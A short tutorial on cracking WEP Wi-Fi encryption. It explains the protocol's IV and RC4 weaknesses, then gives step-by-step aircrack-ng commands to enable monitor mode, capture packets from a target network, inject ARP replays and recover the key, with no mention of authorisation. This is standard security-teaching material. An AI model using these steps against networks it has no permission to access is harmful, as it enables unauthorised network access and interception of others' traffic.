### 🧠 WEP Cracking Basics

Cracking WEP (Wired Equivalent Privacy) involves exploiting **design flaws in WEP encryption**, particularly its **weak Initialization Vectors (IVs)** and **RC4 cipher implementation**.

Here’s a breakdown of the **basics**:

---

## 🔐 What is WEP?

* **WEP** is an outdated Wi-Fi security protocol introduced in 1997.
* Uses **RC4 stream cipher** for encryption.
* Combines:

  * A **secret key** (40 or 104 bits).
  * A **24-bit Initialization Vector (IV)** → sent in plaintext with every packet.
* WEP is **no longer secure** and has been replaced by WPA/WPA2.

---

## 🔎 Why Is WEP Crackable?

### 1. **Small IV Size**

* Only 24 bits → IVs **repeat frequently**, especially in busy networks.

### 2. **Weak RC4 Key Scheduling**

* Certain IVs (called **"weak IVs"**) **leak information** about the key when used with RC4.
* An attacker collects these IVs and **uses statistical analysis** to guess the key.

### 3. **IVs are Public**

* Every packet includes the IV in **cleartext**, making it easy to collect.

---

## 🛠️ Basic Tools Used

* **Kali Linux**: Pre-loaded with all required tools.
* **Aircrack-ng Suite**:

  * `airodump-ng`: Captures wireless packets.
  * `aireplay-ng`: Injects packets to generate traffic.
  * `aircrack-ng`: Cracks the WEP key using captured IVs.

---

## 📋 Steps to Crack WEP (Basics)

### 1. Put Wi-Fi Adapter in Monitor Mode

```bash
airmon-ng start wlan0
```

### 2. Capture Packets (and IVs)

```bash
airodump-ng wlan0mon
```

* Identify the target network (BSSID and channel).
* Then capture on a specific channel:

```bash
airodump-ng --bssid <BSSID> -c <channel> -w wep_capture wlan0mon
```

### 3. (Optional) Inject ARP Packets

Speeds up IV collection:

```bash
aireplay-ng --arpreplay -b <BSSID> -h <your_MAC> wlan0mon
```

### 4. Crack the WEP Key

```bash
aircrack-ng wep_capture-01.cap
```

---

## ✅ How Many Packets Are Needed?

* Around **10,000 to 100,000 IVs** for 64-bit WEP.
* Sometimes more for 128-bit.

